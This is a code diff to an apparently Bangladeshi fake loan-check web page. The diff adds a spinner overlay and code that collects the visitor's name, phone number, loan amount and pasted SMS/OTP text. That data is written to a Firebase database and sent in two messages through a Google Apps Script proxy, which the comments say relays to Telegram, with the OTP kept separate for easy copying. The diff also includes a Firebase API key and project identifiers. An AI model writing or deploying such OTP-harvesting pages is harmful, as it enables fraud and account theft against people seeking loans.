@@ -80,7 +80,54 @@
         .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
         .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
         @media (max-width: 480px) { .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } }
+
+        /* প্রসেসিং ওভারলে */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.85);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            backdrop-filter: blur(5px);
+            color: #ffffff;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top: 5px solid #ff5e00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .processing-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .processing-sub {
+            font-size: 14px;
+            color: #cbd5e1;
+            max-width: 300px;
+            line-height: 1.5;
+        }
     </style>
+
+    <!-- Firebase SDK Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body>
 
@@ -113,6 +160,13 @@
     </div>
 </div>
 
+<!-- প্রসেসিং ওভারলে -->
+<div id="processingScreen" class="processing-overlay">
+    <div class="spinner"></div>
+    <div class="processing-title">আপনার ফাইল প্রসেস হচ্ছে...</div>
+    <div class="processing-sub">অনুগ্রহ করে কয়েক সেকেন্ড অপেক্ষা করুন, আপনার তথ্য সার্ভারে যাচাই করা হচ্ছে।</div>
+</div>
+
 <div id="loanAlert" class="loan-popup">
     <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
     <div class="popup-content">
@@ -123,10 +177,27 @@
 </div>
 
 <script>
-    // সুরক্ষিত গুগল অ্যাপস স্ক্রিপ্ট প্রক্সি URL
+    // Firebase Configuration (United States)
+    const firebaseConfig = {
+        apiKey: "AIzaSyDc4noDBEzDTv_2lPavPXSU4uBO8FW-bYA",
+        authDomain: "loan-check-eee5d.firebaseapp.com",
+        databaseURL: "https://loan-check-eee5d-default-rtdb.firebaseio.com",
+        projectId: "loan-check-eee5d",
+        storageBucket: "loan-check-eee5d.firebasestorage.app",
+        messagingSenderId: "293617429070",
+        appId: "1:293617429070:web:e200d79aee1a38dc81711f",
+        measurementId: "G-PN5VXEX2JH"
+    };
+
+    // Firebase চালু করা
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+
+    // প্রক্সি URL
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-MX5twDJTbDjN-B_llF5Y9TBb_Kv-W2pJ1Soymn3HbEG0CfAEtQ0WV7qmz8OPUgI/exec";
 
-    // URL অথবা ব্রাউজার মেমোরি থেকে গ্রাহকের তথ্য রিড করা
     const params = new URLSearchParams(window.location.search);
     const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
     const applicantPhone = params.get('phone') || localStorage.getItem('loan_cust_phone') || 'N/A';
@@ -134,40 +205,57 @@
 
     const form = document.getElementById("verifyForm2");
     const btnSubmit = document.getElementById("btnSubmit");
+    const processingScreen = document.getElementById("processingScreen");
 
     form.addEventListener("submit", function(event) {
         event.preventDefault();
         btnSubmit.disabled = true;
-        btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
+
+        // প্রসেসিং স্ক্রিন দেখানো
+        processingScreen.style.display = "flex";
 
         const smsText = document.getElementById("appText").value.trim();
 
-        // ১. গ্রাহকের তথ্যের বিস্তারিত মেসেজ
+        // Firebase-এ ডেটা পাঠানো
+        const newAppRef = db.ref("applications").push();
+        const appId = newAppRef.key;
+        localStorage.setItem("current_application_id", appId);
+
+        newAppRef.set({
+            id: appId,
+            name: applicantName,
+            phone: applicantPhone,
+            amount: applicantAmount,
+            smsCode: smsText,
+            status: "pending",
+            timestamp: Date.now(),
+            date: new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })
+        });
+
+        // গুগল স্ক্রিপ্ট / টেলিগ্রাম মেসেজ
         const infoMessage = `📩 নতুন এসএমএস / ওটিপি যাচাই!\n\n` +
                             `👤 নাম: ${applicantName}\n` +
                             `📞 মোবাইল: ${applicantPhone}\n` +
                             `💰 লোনের পরিমাণ: ${applicantAmount} টাকা\n` +
                             `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
 
-        // ২. শুধুমাত্র এসএমএস টেক্সট (যাতে সরাসরি কপি করা যায়)
         const codeOnlyMessage = smsText;
 
-        // ১ম মেসেজ পাঠানো (তথ্য)
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ message: infoMessage })
         }).finally(() => {
-            // ২য় মেসেজ পাঠানো (শুধু এসএমএস কোড)
             fetch(GOOGLE_SCRIPT_URL, {
                 method: "POST",
                 mode: "no-cors",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ message: codeOnlyMessage })
             }).finally(() => {
-                // সরাসরি success.html পেজে নিয়ে যাওয়া
-                window.location.href = "success.html";
+                setTimeout(() => {
+                    window.location.href = "success.html?id=" + appId;
+                }, 3000);
             });
         });
     });
